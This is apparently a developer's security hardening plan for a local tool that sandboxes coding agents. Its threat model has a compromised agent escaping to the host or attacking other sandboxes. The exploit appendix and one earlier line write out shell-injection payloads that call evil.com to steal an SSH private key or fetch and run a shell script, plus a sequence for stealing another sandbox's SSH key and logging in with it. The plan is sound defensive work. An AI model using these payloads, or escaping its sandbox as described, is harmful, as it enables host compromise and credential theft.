# Handler Security Hardening Plan

**Date:** 2026-02-18
**Context:** Handler is a local development tool that spawns Docker containers and Firecracker microVMs as sandboxes for coding agents. The server runs on the developer's machine. The primary threat is a malicious or compromised agent inside a sandbox attempting to reach the control-plane API and exploit it.

---

## Table of Contents

1. [Threat Model](#1-threat-model)
2. [Current Exposure](#2-current-exposure)
3. [Hardening Plan](#3-hardening-plan)
   - [Layer 1: Network Isolation](#layer-1-network-isolation)
   - [Layer 2: Command Injection Elimination](#layer-2-command-injection-elimination)
   - [Layer 3: Input Validation](#layer-3-input-validation)
4. [Out of Scope](#4-out-of-scope)
5. [Appendix: Exploit Examples](#appendix-exploit-examples)
6. [Appendix: File Change Matrix](#appendix-file-change-matrix)

---

## 1. Threat Model

### What this is

A local dev tool. One user (the developer), running on their machine, accessed via `localhost`. Not a production SaaS. Not exposed to the internet.

### What we're defending against

A **coding agent running inside a sandbox** that attempts to:

1. **Escape to the host** — execute commands on the developer's machine (where all their SSH keys, git credentials, cloud tokens, browser sessions, and source code live)
2. **Access other sandboxes** — read files from, write files to, or get shell access in another agent's sandbox
3. **Disrupt the control plane** — crash the Handler server, corrupt its state, or manipulate other sandboxes via the API

### What the agent has

- Full shell access inside its container/VM (by design)
- Outbound network access (needed for `git clone`, `npm install`, etc.)
- The ability to make HTTP requests to any reachable host

### The critical question: Can agents reach the Handler API?

**Yes.** Two facts from the code:

1. `server.listen(port)` at `index.ts:675` has no host parameter, so Node.js binds to `0.0.0.0` (all interfaces)
2. Docker containers use the default bridge network (no `NetworkMode` set in `docker.ts:87-100`), so they can reach the host at the bridge gateway IP (typically `172.17.0.1:4001`)
3. Firecracker VMs use TAP devices with a gateway to the host — same result

This means every sandbox can call `curl http://172.17.0.1:4001/api/...` and hit the full Handler API with no authentication.

---

## 2. Current Exposure

With network access to the API, an agent can currently:

| Action | How | Impact |
|---|---|---|
| **Get RCE on the host** | Upload a file with a shell-injection filename via `POST /api/sandboxes/:id/upload` | Full host compromise — the developer's machine |
| **Get RCE on the host** | Set `destPath` to a string containing shell metacharacters | Same |
| **Get RCE on the host** | Request file download with injected `path` query parameter | Same |
| **List all sandboxes** | `GET /api/sandboxes` (no auth) | Enumerate all other agents' sandboxes |
| **Read files from other sandboxes** | `GET /api/sandboxes/:other/files/download?path=...` | Steal code, secrets, credentials from other agents |
| **Write files into other sandboxes** | `POST /api/sandboxes/:other/upload` | Plant backdoors, corrupt other agents' work |
| **Get SSH keys for other sandboxes** | `GET /api/sandboxes/:other/ssh-key` | SSH directly into other sandboxes, bypassing Handler |
| **Delete other sandboxes** | `DELETE /api/sandboxes/:other` | Destroy other agents' work |
| **Create new sandboxes** | `POST /api/sandboxes` | Resource exhaustion, launch attack infrastructure |
| **Open terminals in other sandboxes** | WebSocket to `/ws/terminal` with another sandbox's ID | Interactive shell in any sandbox |

The root causes are:

1. **No network isolation** — agents can reach the API
2. **Command injection** — user-controlled strings interpolated into `execSync` shell commands
3. **No authentication** — every API endpoint and WebSocket connection is open
4. **No input validation** — paths, filenames, and IDs are not sanitized

---

## 3. Hardening Plan

Three layers, in priority order. Each layer is independently valuable — Layer 1 alone eliminates ~80% of the attack surface.

### Layer 1: Network Isolation

**Goal:** Prevent sandboxes from reaching the Handler API entirely. If the agent can't talk to the API, none of the other vulnerabilities are reachable.

**Effort:** Low
**Impact:** Highest

#### 1.1 Bind server to localhost

```typescript
// packages/server/src/index.ts:675
// BEFORE:
server.listen(port, async () => {

// AFTER:
server.listen(port, '127.0.0.1', async () => {
```

This single change makes the API unreachable from Docker bridge networks and TAP interfaces. Only processes on the host itself (the Vite dev server, the developer's browser) can connect.

#### 1.2 Firewall rules for defense in depth

Even with localhost binding, add iptables rules as a safety net. If the binding is ever changed, or if a future code path opens a second listener, the firewall still blocks sandbox-to-host API traffic.

Add to `scripts/setup.sh`:

```bash
# Block sandbox-to-host traffic on the Handler API port.
# Docker containers reach the host via the bridge gateway;
# Firecracker VMs reach the host via TAP device gateways.
HANDLER_PORT="${HANDLER_PORT:-4001}"

# Docker bridge interfaces
iptables -C INPUT -i docker0 -p tcp --dport "$HANDLER_PORT" -j DROP 2>/dev/null || \
  iptables -I INPUT -i docker0 -p tcp --dport "$HANDLER_PORT" -j DROP

# Custom Docker bridge networks (br-* interfaces)
iptables -C INPUT -i br-+ -p tcp --dport "$HANDLER_PORT" -j DROP 2>/dev/null || \
  iptables -I INPUT -i br-+ -p tcp --dport "$HANDLER_PORT" -j DROP

# Firecracker TAP interfaces
iptables -C INPUT -i fc-tap+ -p tcp --dport "$HANDLER_PORT" -j DROP 2>/dev/null || \
  iptables -I INPUT -i fc-tap+ -p tcp --dport "$HANDLER_PORT" -j DROP

# Cloud-Hypervisor TAP interfaces
iptables -C INPUT -i ch-tap+ -p tcp --dport "$HANDLER_PORT" -j DROP 2>/dev/null || \
  iptables -I INPUT -i ch-tap+ -p tcp --dport "$HANDLER_PORT" -j DROP
```

Add corresponding rules to `scripts/uninstall.sh` to clean up.

#### 1.3 WebSocket binding

Verify the WebSocket upgrade handler inherits the same listener. Since the `ws` library's `WebSocketServer` is attached to the same HTTP server (`new WebSocketServer({ server })`), it will inherit the `127.0.0.1` binding. No separate change needed.

#### Files to modify

| File | Change |
|---|---|
| `packages/server/src/index.ts` | Add `'127.0.0.1'` to `server.listen()` |
| `scripts/setup.sh` | Add iptables rules |
| `scripts/uninstall.sh` | Add iptables cleanup |

---

### Layer 2: Command Injection Elimination

**Goal:** Even if network isolation fails (misconfigured firewall, `docker run --net=host`, future code change), the API should not be exploitable for host-level code execution.

**Effort:** Medium (mechanical refactoring of ~60 call sites)
**Impact:** High — eliminates the worst-case outcome (host RCE)

#### The problem

Throughout `sandboxes.ts`, `terminal.ts`, `vm-terminal.ts`, and `sandbox-inject.ts`, user-controlled values are interpolated into shell command strings passed to `execSync`:

```typescript
// sandboxes.ts:899 — filename comes from uploaded File.name
execSync(`docker cp "${tempPath}" ${containerId}:"${destPath}/${filename}"`, { stdio: 'pipe' });
```

A filename like `$(curl evil.com/x|sh)` executes on the host because `$()` expands inside double quotes in bash.

The same pattern affects: `destPath` (from form data), `requestedPath` (from query params), `filePath` (from query params), `containerId` (from URL params), `vmIp` (from sandbox metadata), and `tmuxSession` (from session store).

#### The fix: `execFileSync` with argument arrays

`execFileSync` bypasses the shell entirely. Arguments are passed directly to the process as an argv array — no shell parsing, no expansion, no injection.

##### 2.1 Create a safe execution utility

Create `packages/server/src/lib/safe-exec.ts`:

```typescript
import { execFileSync, execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

/**
 * Execute a command safely by passing arguments as an array.
 * Never interpolates into a shell string — immune to injection.
 */
export function safeExecSync(
  command: string,
  args: string[],
  options?: { timeout?: number; encoding?: BufferEncoding }
): string {
  const result = execFileSync(command, args, {
    stdio: 'pipe',
    timeout: options?.timeout ?? 30000,
    encoding: options?.encoding ?? 'utf-8',
  });
  return typeof result === 'string' ? result : result.toString('utf-8');
}

export async function safeExec(
  command: string,
  args: string[],
  options?: { timeout?: number }
): Promise<string> {
  const { stdout } = await execFileAsync(command, args, {
    timeout: options?.timeout ?? 30000,
  });
  return stdout;
}
```

##### 2.2 Refactor patterns in `sandboxes.ts`

**Docker exec/cp** (~25 call sites):

```typescript
// BEFORE (vulnerable):
execSync(`docker exec ${containerId} mkdir -p "${fullDestDir}"`, { stdio: 'pipe' });
execSync(`docker cp "${tempPath}" ${containerId}:"${destPath}/${filename}"`, { stdio: 'pipe' });
execSync(`docker exec ${containerId} chown -R dev:dev "${destPath}/${filename.split('/')[0]}"`, { stdio: 'pipe' });
execSync(`docker exec ${containerId} ls -la --time-style=long-iso "${requestedPath}"`, ...);
execSync(`docker cp ${containerId}:"${filePath}" "${tmpFile}"`, ...);

// AFTER (safe):
execFileSync('docker', ['exec', containerId, 'mkdir', '-p', fullDestDir], { stdio: 'pipe' });
execFileSync('docker', ['cp', tempPath, `${containerId}:${destPath}/${filename}`], { stdio: 'pipe' });
execFileSync('docker', ['exec', containerId, 'chown', '-R', 'dev:dev', `${destPath}/${filename.split('/')[0]}`], { stdio: 'pipe' });
execFileSync('docker', ['exec', containerId, 'ls', '-la', '--time-style=long-iso', requestedPath], ...);
execFileSync('docker', ['cp', `${containerId}:${filePath}`, tmpFile], ...);
```

**SSH/SCP** (~20 call sites):

```typescript
// BEFORE (vulnerable):
execSync(
  `ssh -i "${keyPath}" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -o ConnectTimeout=5 agent@${vmIp} "mkdir -p ${escapeRemotePath(fullDestDir)}"`,
  { stdio: 'pipe', timeout: 60000 }
);

// AFTER (safe):
execFileSync('ssh', [
  '-i', keyPath,
  '-o', 'StrictHostKeyChecking=no',
  '-o', 'UserKnownHostsFile=/dev/null',
  '-o', 'IdentitiesOnly=yes',
  '-o', 'ConnectTimeout=5',
  `agent@${vmIp}`,
  'mkdir', '-p', fullDestDir,
], { stdio: 'pipe', timeout: 60000 });
```

Note: with `execFileSync('ssh', [...])`, the remote command arguments (`mkdir`, `-p`, `fullDestDir`) are passed as separate SSH arguments. SSH sends them to the remote shell joined by spaces, which is the same as quoting them — no remote injection is possible from the local side. The `escapeRemotePath()` helper is no longer needed.

**SCP** follows the same pattern:

```typescript
execFileSync('scp', [
  '-i', keyPath,
  '-o', 'StrictHostKeyChecking=no',
  '-o', 'UserKnownHostsFile=/dev/null',
  '-o', 'IdentitiesOnly=yes',
  '-o', 'ConnectTimeout=5',
  tempPath,
  `agent@${vmIp}:${destPath}/${filename}`,
], { stdio: 'pipe', timeout: 300000 });
```

##### 2.3 Refactor patterns in `terminal.ts`

4 call sites where `containerId` and `tmuxSession` are interpolated:

```typescript
// BEFORE:
await execAsync(`docker exec ${containerId} tmux has-session -t ${tmuxSession} 2>/dev/null`);
await execAsync(`docker exec ${containerId} tmux kill-session -t ${tmuxSession} 2>/dev/null`);
await execAsync(`docker exec ${containerId} tmux resize-window -t ${tmuxSession} -x ${cols} -y ${rows}`);

// AFTER:
await safeExec('docker', ['exec', containerId, 'tmux', 'has-session', '-t', tmuxSession]);
await safeExec('docker', ['exec', containerId, 'tmux', 'kill-session', '-t', tmuxSession]);
await safeExec('docker', ['exec', containerId, 'tmux', 'resize-window', '-t', tmuxSession, '-x', String(cols), '-y', String(rows)]);
```

##### 2.4 Refactor patterns in `vm-terminal.ts`

~10 call sites where `vmIp` and `tmuxSession` are interpolated into SSH commands:

```typescript
// BEFORE (sshExec helper at line 47):
const { stdout } = await execAsync(
  `ssh -i ${sshKeyPath} -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 agent@${vmIp} '${escaped}'`,
  { timeout: 5000 }
);

// AFTER:
const { stdout } = await execFileAsync('ssh', [
  '-i', sshKeyPath,
  '-o', 'IdentitiesOnly=yes',
  '-o', 'StrictHostKeyChecking=no',
  '-o', 'UserKnownHostsFile=/dev/null',
  '-o', 'ConnectTimeout=3',
  `agent@${vmIp}`,
  command,  // passed as a single arg — SSH sends it to the remote shell
], { timeout: 5000 });
```

The Daytona SSH command passthrough (`vm-terminal.ts:560-567`) needs special handling. It currently passes an arbitrary command string from the Daytona API to `spawn('sh', ['-c', command])`. Instead, parse and reconstruct it:

```typescript
// BEFORE (arbitrary shell command from external API):
const sshProcess = spawn('sh', ['-c', modifiedCommand], { ... });

// AFTER: Parse the SSH command, extract known parameters, reconstruct safely
function parseSshCommand(raw: string): { user: string; host: string; port?: string; identityFile?: string } {
  // Only extract: user@host, -p port, -i identityFile
  // Reject anything that doesn't match "ssh [opts] user@host"
  const userHostMatch = raw.match(/(\w+)@([\w.\-]+)\s*$/);
  if (!userHostMatch) throw new Error('Cannot parse SSH command');

  const portMatch = raw.match(/-p\s+(\d+)/);
  const identityMatch = raw.match(/-i\s+(\S+)/);

  return {
    user: userHostMatch[1],
    host: userHostMatch[2],
    port: portMatch?.[1],
    identityFile: identityMatch?.[1],
  };
}

const parsed = parseSshCommand(sshCommand);
const sshProcess = spawn('ssh', [
  '-tt',
  ...(parsed.port ? ['-p', parsed.port] : []),
  ...(parsed.identityFile ? ['-i', parsed.identityFile] : []),
  '-o', 'StrictHostKeyChecking=no',
  `${parsed.user}@${parsed.host}`,
], { ... });
```

##### 2.5 Refactor patterns in `sandbox-inject.ts`

~5 call sites:

```typescript
// BEFORE:
execSync(`ssh -i "${keyPath}" ... agent@${sandbox.guestIp} "mkdir -p '${file.destPath}'"`, ...);
execSync(`scp -i "${keyPath}" ... "${tempFilePath}" agent@${sandbox.guestIp}:${file.destPath}/${file.filename}`, ...);
execSync(`docker exec ${containerId} cat "${filePath}" 2>/dev/null || true`, ...);

// AFTER:
execFileSync('ssh', ['-i', keyPath, ...sshOpts, `agent@${sandbox.guestIp}`, 'mkdir', '-p', file.destPath], ...);
execFileSync('scp', ['-i', keyPath, ...sshOpts, tempFilePath, `agent@${sandbox.guestIp}:${file.destPath}/${file.filename}`], ...);
execFileSync('docker', ['exec', containerId, 'cat', filePath], ...);
```

##### 2.6 Safe tar extraction

Add `--no-absolute-names` to prevent tar-slip attacks in directory uploads:

```typescript
// BEFORE:
execSync(`docker exec ${containerId} tar -xzf /tmp/upload.tar.gz -C "${destPath}"`, { stdio: 'pipe' });

// AFTER:
execFileSync('docker', [
  'exec', containerId,
  'tar', '-xzf', '/tmp/upload.tar.gz',
  '-C', destPath,
  '--no-absolute-names',
], { stdio: 'pipe' });
```

Same for SSH-based tar extraction on VMs.

#### Files to modify

| File | Call sites | What changes |
|---|---|---|
| **New:** `packages/server/src/lib/safe-exec.ts` | — | Create utility |
| `packages/server/src/routes/sandboxes.ts` | ~40 | All `execSync` → `execFileSync` with arg arrays |
| `packages/server/src/services/terminal.ts` | 4 | `execAsync` → `safeExec` with arg arrays |
| `packages/server/src/services/vm-terminal.ts` | ~10 | `execAsync` → `safeExec`, refactor `sshExec` helper, parse Daytona SSH |
| `packages/server/src/services/sandbox-inject.ts` | ~5 | `execSync` → `execFileSync` with arg arrays |

---

### Layer 3: Input Validation

**Goal:** Reject malformed inputs at the API boundary so they never reach execution code. Defense in depth — even if Layers 1 and 2 both fail, bad inputs are caught early.

**Effort:** Low
**Impact:** Medium (mostly redundant with Layer 2, but catches bugs and non-injection issues like path traversal within sandboxes)

#### 3.1 Validate sandbox IDs

Sandbox IDs flow into Docker commands and SSH arguments. Enforce a strict format:

```typescript
// packages/server/src/lib/validation.ts
const SANDBOX_ID_REGEX = /^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/;

export function validateSandboxId(id: string): string {
  if (!id || !SANDBOX_ID_REGEX.test(id) || id.length > 128) {
    throw new Error('Invalid sandbox ID');
  }
  return id;
}
```

Apply in route handlers and the WebSocket message handler before any sandbox lookup.

#### 3.2 Validate file paths

Paths are used in `docker exec ls`, `docker cp`, and SSH commands. Even without injection risk (after Layer 2), path traversal within a sandbox should be constrained:

```typescript
export function validatePath(inputPath: string): string {
  if (inputPath.includes('\0')) {
    throw new Error('Path contains null bytes');
  }

  const normalized = path.posix.normalize(inputPath);

  if (normalized.includes('..')) {
    throw new Error('Path traversal not allowed');
  }

  return normalized;
}
```

Apply to: `destPath` in upload, `requestedPath` in file listing, `filePath` in download.

#### 3.3 Validate filenames

Uploaded filenames should not contain path separators or shell metacharacters:

```typescript
export function validateFilename(name: string): string {
  if (!name || name.includes('/') || name.includes('\\') || name.includes('\0')) {
    throw new Error('Invalid filename');
  }
  if (name === '.' || name === '..' || name.length > 255) {
    throw new Error('Invalid filename');
  }
  return name;
}
```

Apply to `file.name` in the upload route.

#### 3.4 Validate IP addresses

VM IP addresses flow into SSH commands. Ensure they're actually IPs:

```typescript
export function validateIpAddress(ip: string): string {
  if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
    throw new Error('Invalid IP address');
  }
  return ip;
}
```

Apply to `vmIp` in WebSocket messages and anywhere `sandbox.guestIp` is used in shell commands.

#### 3.5 Where to apply

```typescript
// Upload route
sandboxes.post('/:id/upload', async (c) => {
  const id = validateSandboxId(c.req.param('id'));
  // ...
  const destPath = validatePath(formData.get('destPath') as string || defaultDestPath);
  const filename = validateFilename(file.name);
  // ...
});

// File listing route
sandboxes.get('/:id/files', async (c) => {
  const id = validateSandboxId(c.req.param('id'));
  const requestedPath = validatePath(c.req.query('path') || '/');
  // ...
});

// Download route
sandboxes.get('/:id/files/download', async (c) => {
  const id = validateSandboxId(c.req.param('id'));
  const filePath = validatePath(c.req.query('path')!);
  // ...
});

// WebSocket terminal messages
case 'start-vm':
  validateSandboxId(msg.vmId);
  validateIpAddress(msg.vmIp);
  // ...
```

#### Files to create/modify

| File | Change |
|---|---|
| **New:** `packages/server/src/lib/validation.ts` | Validation utility functions |
| `packages/server/src/routes/sandboxes.ts` | Add validation calls at top of each handler |
| `packages/server/src/index.ts` | Add validation to WebSocket message handler |

---

## 4. Out of Scope

The following were identified during the audit but are **not worth addressing** for a local development tool:

| Item | Why it's out of scope |
|---|---|
| Full JWT authentication with user management | One user — the developer. Network isolation is the right control, not auth. |
| CORS hardening | Localhost to localhost. Not exposed to the internet. |
| Rate limiting | No public exposure. The developer is the only user. |
| Security headers (CSP, HSTS, X-Frame-Options) | Local UI, not a web application served to untrusted browsers. |
| TLS/HTTPS | Localhost traffic. No network eavesdroppers. |
| Encrypted config at rest | It's the developer's own machine with their own disk encryption. |
| Audit logging | One user, local tool. Standard server logs are sufficient. |
| Request body size limits | No untrusted external traffic. |
| Session store encryption | Sessions reference sandbox IDs, not secrets. |

If Handler is ever exposed beyond localhost (e.g., served to a team over a LAN, or deployed as a cloud service), revisit all of the above.

---

## Appendix: Exploit Examples

These demonstrate why Layers 1 and 2 matter, even for a local tool.

### A. Host RCE via upload filename (Layer 2 prevents)

An agent inside a Docker container exploits command injection to run arbitrary commands on the developer's host machine:

```bash
# From inside the sandbox — agent crafts a malicious upload
curl -X POST http://172.17.0.1:4001/api/sandboxes/docker-abc123/upload \
  -F 'file=@/dev/null;filename=$(cat ~/.ssh/id_ed25519 | curl -X POST -d @- https://evil.com/exfil)' \
  -F 'destPath=/tmp'
```

The server constructs and runs on the host:
```bash
docker cp "/tmp/sandbox-upload-xxx/$(cat ~/.ssh/id_ed25519 | curl -X POST -d @- https://evil.com/exfil)" abc123:"/tmp/..."
```

The `$()` inside double quotes expands on the host. The developer's SSH private key is exfiltrated.

**Layer 1 blocks this** because `172.17.0.1:4001` is unreachable when the server binds to `127.0.0.1`.

**Layer 2 blocks this** because `execFileSync('docker', ['cp', tempPath, ...])` never invokes a shell — `$()` is treated as literal characters.

### B. Cross-sandbox attack (Layer 1 prevents)

Agent A enumerates all sandboxes, steals Agent B's SSH key, and logs into its VM:

```bash
# 1. List all sandboxes
curl -s http://172.17.0.1:4001/api/sandboxes | jq '.[].id'

# 2. Download Agent B's SSH key
curl -s http://172.17.0.1:4001/api/sandboxes/fc-agent-b/ssh-key -o /tmp/b.pem
chmod 600 /tmp/b.pem

# 3. SSH into Agent B's sandbox
ssh -i /tmp/b.pem -o StrictHostKeyChecking=no agent@10.0.0.5
```

**Layer 1 blocks this** — the API is unreachable from inside sandboxes.

### C. Host RCE via download path (Layer 2 prevents)

```bash
curl "http://172.17.0.1:4001/api/sandboxes/docker-abc123/files/download?path=%22%3Bcurl+evil.com%2Fshell.sh%7Cbash%3Becho+%22"
```

The server constructs:
```bash
docker cp abc123:";curl evil.com/shell.sh|bash;echo "" "/tmp/sandbox-download-..."
```

**Layer 2 blocks this** — with `execFileSync`, the path is a single argument to `docker`, not parsed by a shell.

---

## Appendix: File Change Matrix

| File | Layer | Change summary |
|---|---|---|
| `packages/server/src/index.ts` | 1 | Add `'127.0.0.1'` to `server.listen()` call |
| `scripts/setup.sh` | 1 | Add iptables rules blocking sandbox→host API traffic |
| `scripts/uninstall.sh` | 1 | Add iptables rule cleanup |
| **New:** `packages/server/src/lib/safe-exec.ts` | 2 | `safeExecSync` / `safeExec` utility wrapping `execFileSync` |
| `packages/server/src/routes/sandboxes.ts` | 2, 3 | Replace ~40 `execSync` calls with `execFileSync` arg arrays; add input validation |
| `packages/server/src/services/terminal.ts` | 2 | Replace 4 `execAsync` calls with `safeExec` arg arrays |
| `packages/server/src/services/vm-terminal.ts` | 2 | Refactor `sshExec` helper to use `execFileAsync`; replace ~10 call sites; parse Daytona SSH command |
| `packages/server/src/services/sandbox-inject.ts` | 2 | Replace ~5 `execSync` calls with `execFileSync` arg arrays |
| **New:** `packages/server/src/lib/validation.ts` | 3 | `validateSandboxId`, `validatePath`, `validateFilename`, `validateIpAddress` |
